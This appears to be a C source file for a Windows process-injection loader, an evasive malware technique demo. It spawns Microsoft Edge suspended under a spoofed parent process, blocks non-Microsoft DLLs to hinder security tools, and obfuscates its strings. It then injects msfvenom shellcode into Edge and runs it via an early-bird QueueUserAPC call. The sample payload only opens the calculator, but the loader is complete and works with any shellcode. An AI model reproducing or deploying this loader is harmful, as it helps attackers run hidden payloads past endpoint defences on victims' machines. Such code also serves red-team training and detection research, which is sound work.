#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

// Define the process properties
#define PROC_IMAGE "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
#define PROC_CMDLINE "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5"

// Define the parent process to spoof
#define PROC_PARENTPROCESS L"sihost.exe"

// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL ReadEdgeVersionFromRegistry(OUT LPCSTR* ppPath) {
	LSTATUS status = NULL;
	DWORD dwBytesRead = 0;
	PBYTE pBytes = NULL;

	// MS Edge install registry location: Software\\Microsoft\\Edge\\BLBeacon
	char edgeReg[] = { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'E', 'd', 'g', 'e', '\\', 'B', 'L', 'B', 'e', 'a', 'c', 'o', 'n', '\0' };

	// Key in registry containing the MS Edge version
	char edgeVersion[] = { 'v', 'e', 'r', 's', 'i', 'o', 'n', '\0' };

	// Fetching the version's size
	status = RegGetValueA(HKEY_CURRENT_USER, edgeReg, edgeVersion, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
	if (ERROR_SUCCESS != status) {
		printf("[!] RegGetValueA Failed With Error : %d\n", status);
		return FALSE;
	}

	// Allocating heap that will store the version that will be read
	pBytes = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
	if (pBytes == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// Reading the version from "edgeReg" key, from value "edgeVersion"
	status = RegGetValueA(HKEY_CURRENT_USER, edgeReg, edgeVersion, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
	if (ERROR_SUCCESS != status) {
		printf("[!] RegGetValueA Failed With Error : %d\n", status);
		HeapFree(GetProcessHeap(), 0, pBytes);
		return FALSE;
	}
	printf("\t[i] Found Edge version: %s\n", pBytes);

	/* Concatenate the version with the base path C:\\Program Files(x86)\\Microsoft\\Edge\\Application\\ */
	char basePath[] = { 'C', ':', '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F', 'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'E', 'd', 'g', 'e', '\\', 'A', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '\\', '\0' };
	size_t basePathLen = strlen(basePath);
	size_t versionLen = dwBytesRead - 1; // Exclude the null-terminator from the version length

	// Allocate memory for the complete path
	*ppPath = (LPCSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, basePathLen + versionLen + 1);
	if (*ppPath == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pBytes);
		return FALSE;
	}

	// Copy the base path to ppPath
	if (strcpy_s((char*)*ppPath, basePathLen + versionLen + 1, basePath) != 0) {
		printf("[!] strcpy_s Failed\n");
		HeapFree(GetProcessHeap(), 0, *ppPath);
		HeapFree(GetProcessHeap(), 0, pBytes);
		return FALSE;
	}

	// Concatenate the version at the end of ppPath
	if (strcat_s((char*)*ppPath, basePathLen + versionLen + 1, (const char*)pBytes) != 0) {
		printf("[!] strcat_s Failed\n");
		HeapFree(GetProcessHeap(), 0, *ppPath);
		HeapFree(GetProcessHeap(), 0, pBytes);
		return FALSE;
	}

	// Print the full concatenated path
	printf("\t[i] Edge full Path: %s\n", *ppPath);

	// Free the version buffer
	HeapFree(GetProcessHeap(), 0, pBytes);

	return TRUE;
}

// This function will return the integrity level of a process
LPCWSTR getIntegrityLevel(HANDLE hProcess) {
	HANDLE hToken;
	OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);

	DWORD cbTokenIL = 0;
	PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
	pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
	GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

	DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

	if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
		return L"LOW";
	}
	else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
		return L"MEDIUM";
	}
	else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
		return L"HIGH";
	}
	else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
		return L"SYSTEM";
	}
}

// This function will return the PID of a process
DWORD getPPID(LPCWSTR processName) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);
	DWORD matchingProcessID = 0;

	if (Process32First(snapshot, &process)) {
		do {
			if (!wcscmp(process.szExeFile, processName)) {
				HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
				if (hProcess) {
					LPCWSTR integrityLevel = NULL;
					integrityLevel = getIntegrityLevel(hProcess);
					if (!wcscmp(integrityLevel, L"MEDIUM")) {
						matchingProcessID = process.th32ProcessID;
						break;
					}
				}
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return matchingProcessID;
}

// This function will spawn a process in suspended state
BOOL SpawnProcess(HANDLE hParentProcess, LPCSTR lpProcessName, LPCSTR lpProcessDirectory, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	STARTUPINFOEXA			SiEx = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };
	SIZE_T					sAttrSize = NULL;
	PVOID					pAttrBuf = NULL;

	// Cleaning the structs
	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Set the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	SiEx.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

	// This will fail but will return the PROC_THREAD_ATTRIBUTE_LIST size
	InitializeProcThreadAttributeList(NULL, 2, NULL, &sAttrSize);
	pAttrBuf = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sAttrSize);

	// Initialise the list with 2 attributes (one for block dll and one for ppid spoof)
	if (!InitializeProcThreadAttributeList(pAttrBuf, 2, NULL, &sAttrSize)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Atribute 1: BLOCK NON-MS DLLS ----------------------------------------------------------------------------------------------
	DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Assigning the mitigation policy to the attribute list
	if (!UpdateProcThreadAttribute(pAttrBuf, NULL, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy, sizeof(DWORD64), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Atribute 2: PPID SPOOFING --------------------------------------------------------------------------------------------------
	if (!UpdateProcThreadAttribute(pAttrBuf, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Assigning the attributes to the STARTUPINFOEX
	SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pAttrBuf;

	if (!CreateProcessA(
		lpProcessName,
		PROC_CMDLINE,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		lpProcessDirectory,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	// cleaning up
	DeleteProcThreadAttributeList(pAttrBuf);

	// Populate the OUTPUT parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	return TRUE;
}

BOOL InjectToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	DWORD dwOldProtection = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	// Allocate memory in the remote process
	*ppAddress = VirtualAllocEx(hProcess, NULL, sizeof(Payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Allocated memory at : 0x%p \n", *ppAddress);

	// Write the shellcode to the allocated memory
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully written payload of %d bytes\n", sNumberOfBytesWritten);

	// Change the memory protection to PAGE_EXECUTE_READ
	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main()
{
	HANDLE	hPProcess		= NULL,
			hProcess		= NULL,
			hThread			= NULL;
	DWORD	dwParentPID		= NULL,
			dwProcessId		= NULL;
	PVOID	pAddress		= NULL;

	// Get the PID of the process to spoof
	dwParentPID = getPPID(PROC_PARENTPROCESS);
	if (dwParentPID == NULL) {
		printf("[!] Target process is not running \n");
		return -1;
	}

	// Openning a handle to the parent process we want to spoof
	if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwParentPID)) == NULL) {
		printf("[!] OpenProcess failed with error : %d \n", GetLastError());
		return -1;
	}

	// Retrieve MS Edge version from registry
	printf("[i] Looking for MS Edge version in the registry\n");
	LPCSTR pEdgePath = NULL;
	if (!ReadEdgeVersionFromRegistry(&pEdgePath)) {
		printf("[-] Error retrieving Microsoft Edge path\n");
		return -1;
	}

	printf("\n[i] Spawning process in suspended state\n", PROC_IMAGE);
	if (!SpawnProcess(hPProcess, PROC_IMAGE, pEdgePath, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] msedge.exe spawned (PID: %d)\n", dwProcessId);
	printf("\t[i] Image file name: %s\n", PROC_IMAGE);
	printf("\t[i] Command line: %s\n", PROC_CMDLINE);
	printf("\t[i] Current directory: %s\n", pEdgePath);
	printf("\t[i] Parent: %ws (PID: %d)\n", PROC_PARENTPROCESS, dwParentPID);

	printf("\n[i] Check the process properties. Press [ENTER] to continue\n");
	getchar();

	// Inject shellcode in the spawned process
	printf("[i] Injecting shellcode to the spawned process\n");
	if (!InjectToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}

	// Queue the APC so thread resumes at allocated mem point (payload)
	printf("\n[i] Running QueueUserAPC\n");
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

	printf("[i] Press [ENTER] to resume the thread and run the shellcode\n");
	getchar();

	// Resuming the process thread
	ResumeThread(hThread);

	// Closing handles
	CloseHandle(hProcess);
	CloseHandle(hThread);

	printf("[i] Done\n");

	return 0;
}
